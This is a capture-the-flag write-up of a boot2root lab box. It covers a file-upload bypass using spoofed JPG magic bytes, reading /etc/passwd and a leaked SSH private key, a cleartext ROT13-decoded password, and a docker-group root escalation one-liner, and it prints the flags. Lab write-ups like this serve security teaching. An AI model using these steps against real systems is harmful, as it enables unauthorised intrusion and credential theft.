## BattleX CTF: another_machine 
#### Category: Boot2Root
#### Score: 30
#### Number of Solves: 4 

### TL; DR

Exploit upload functionality of a webserver to gain initial access, escalating privilege from low privileged user to a more privileged user through exposed ssh credentials and to root using docker group.

### Recon

```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-29 17:10 WAT
Nmap scan report for 10.10.90.12
Host is up (0.42s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f8:89:12:c0:ab:91:e2:29:1f:55:a6:b1:aa:48:e5:37 (RSA)
|   256 46:05:a8:f4:66:29:41:79:01:a0:43:b8:a9:ef:47:5d (ECDSA)
|_  256 04:db:fa:b1:16:82:c5:99:86:41:ba:8a:ea:72:34:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Death Note - Add Names
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.66 seconds
```

We have two services running. One SSH on port 22 and Apache web server on port 80. The versions of the services doesn't look like one with a public available exploit to hasten my progress.

### Exploring

![Port 80](https://i.imgur.com/IiUJoIt.png)

_Apache on port 80_

On uploading a JPG file, nothing happens, it seems it uploaded. But to what location?

I used `gobuster` to do a light directory bruteforce, using a common.txt wordlist from SecLists.

![Imgur](https://i.imgur.com/bTuZUNJ.png)

_Gobuster result_

/notes was discovered and on checking, it contained the uploaded file in it. Nice, I could exploit this upload to gain initial access to the base system. I tried uploading a php shell and was greeted by this. 

![Imgur](https://i.imgur.com/drkMEXr.png)

This _thing_ is validating the file signature and less likely the file extension (.php). To bypass this upload restriction. I copied a jpg file magic and pasted in the request, using BurpSuite Repeater.

![Imgur](https://i.imgur.com/RZfkdLr.png)

Boom, my shell uploaded.

![Imgur](https://i.imgur.com/cSUR2FR.png)

### Gaining access 

I opened my equivalent netcat listener and I have shell.

![Imgur](https://i.imgur.com/z6dd8hT.png)

```
www-data@deathnote:/opt/containerd$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[snip]
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
[snip]
ryuk:x:1000:1000:ryuk:/home/ryuk:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
light:x:1001:1001:,,,:/home/light:/bin/bash
```

### Privilege escalation

We have two users apart from root. Next, I uploaded linpeas to quicken my system enumeration proceedure. Linpeas detected a ssh private key in /opt/containerd/ directory which should belong to either of the users or probably root. 

```
www-data@deathnote:/opt/containerd$ ls

bin
id_rsa
lib
www-data@deathnote:/opt/containerd$ cat id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAzndKq1pSh74SM3nfOe2Wk+lcoLF6sIQMwL4wo7wTuRALVS8O
wDiejhpCJuZ72EAujPmsxJrDN5eD9h3Gvaf56gPcSBEomVoU2oWBVaISTuKjOvXK
[snip]
9cN3D9ruIqD060p8gTfKZAuvMKoTP3ChHAxdXVDcjl6ChTPCKRigQf0=
-----END RSA PRIVATE KEY-----
```
It turned out to be the ssh key for ryuk, now, I will use a more standard and stable shell access.

![Imgur](https://i.imgur.com/r0AGEGy.png)

_user.txt and I can't cat it??_

```
ryuk@deathnote:~$ ls -lah
total 44K
drwx---r-x 6 ryuk  ryuk 4.0K Jun 16 01:23 .
drwxr-xr-x 4 root  root 4.0K Jun 15 01:17 ..
lrwxrwxrwx 1 ryuk  ryuk    9 Jun 16 01:08 .bash_history -> /dev/null
-rw-r--r-- 1 ryuk  ryuk  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 ryuk  ryuk 3.7K Apr  4  2018 .bashrc
drwx------ 2 ryuk  ryuk 4.0K Jun 14 20:52 .cache
drwx------ 3 ryuk  ryuk 4.0K Jun 14 20:52 .gnupg
drwxrwxr-x 3 ryuk  ryuk 4.0K Jun 15 00:49 .local
-rw-r--r-- 1 ryuk  ryuk  807 Apr  4  2018 .profile
-rwx------ 1 ryuk  ryuk   24 Jun 15 01:16 rotedcreds
drwx------ 2 ryuk  ryuk 4.0K Jun 16 01:28 .ssh
-rw-r--r-- 1 ryuk  ryuk    0 Jun 14 20:55 .sudo_as_admin_successful
-rwxr----- 1 light root   33 Jun 15 01:21 user.txt
```

user.txt is owed by user light and root and there's a suspicious `rotedcreds` file which contained a ciphered text. I will proceed to use cyberchef or any tool to anaylse the text and get something useful from it.

![Imgur](https://i.imgur.com/VmKtjp7.png)

_ROT13 with amount 13_

Credential for light, gotten.

light:0lightyagami23433

```
ryuk@deathnote:~$ su light
Password:
light@deathnote:/home/ryuk$ cat user.txt
5eb63bbbe01eeed093cb22bb8f5acdc3
light@deathnote:/home/ryuk$
```

User flag gotten!!

User flag: `5eb63bbbe01eeed093cb22bb8f5acdc3` 

### Privilege escalation to root

![Imgur](https://i.imgur.com/NIr8bZQ.png)

_Manual enumeration_

Light may not use sudo but Light is in the docker group. Meaning, Light can run docker as root. I can easily escalate to root with this discovery. By running this command, `docker run -v /:/mnt --rm -it alpine chroot /mnt bash` (source: gtfobins), I will be spawned into a root shell.

![Imgur](https://i.imgur.com/e0sZ5EU.png)

```
root@729fd2f76468:~# ls -lah
total 40K
drwx------  6 root root 4.0K Jun 16 02:12 .
drwxr-xr-x 24 root root 4.0K Jun 14 20:01 ..
lrwxrwxrwx  1 root root    9 Jun 15 04:14 .bash_history -> /dev/null
[snip]
drwx------  2 root root 4.0K Jun 14 20:51 .ssh
-r--r--r--  1 root root  353 Jun 15 01:37 deathnote
-rw-------  1 root root  123 Jun 16 02:12 root.txt
root@729fd2f76468:~# cat root.txt
here is your flag but please remove the deathnote before leaving h4ckerm4n

1f3870be274f6c49b3e31a0c6728957f
root@729fd2f76468:~#
```
Root flag gotten.

Root flag:`1f3870be274f6c49b3e31a0c6728957f`

### Extras

There's a note saying I should remove the deathnote before leaving, its clearly having read and no write permissions. 

```
root@729fd2f76468:~# chmod 777 deathnote
chmod: changing permissions of 'deathnote': Operation not permitted
root@729fd2f76468:~# chattr -i deathnote
Hacksparo was too smart -i deathnote
```
_Tried to use chattr_

I will figure out a way later. Onto the next.

### References

1. [gtfobins](https://gtfobins.github.io/gtfobins/docker/)